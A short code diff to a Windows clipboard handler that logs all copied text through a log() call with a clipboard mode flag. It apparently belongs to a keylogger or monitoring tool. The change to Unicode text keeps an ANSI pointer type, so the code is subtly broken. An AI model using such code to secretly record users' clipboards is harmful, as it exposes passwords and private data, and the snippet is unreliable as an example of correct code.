@@ -5,10 +5,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
 {
     if (msg == WM_CLIPBOARDUPDATE)
     {
-        if (IsClipboardFormatAvailable(CF_TEXT))
+        if (IsClipboardFormatAvailable(CF_UNICODETEXT))
         {
             OpenClipboard(hwnd);
-            HGLOBAL hDatas = GetClipboardData(CF_TEXT);
+            HGLOBAL hDatas = GetClipboardData(CF_UNICODETEXT);
             LPSTR datas = GlobalLock(hDatas);
             if (datas != NULL)
                 log(datas, CLPB_MODE, TRUE);
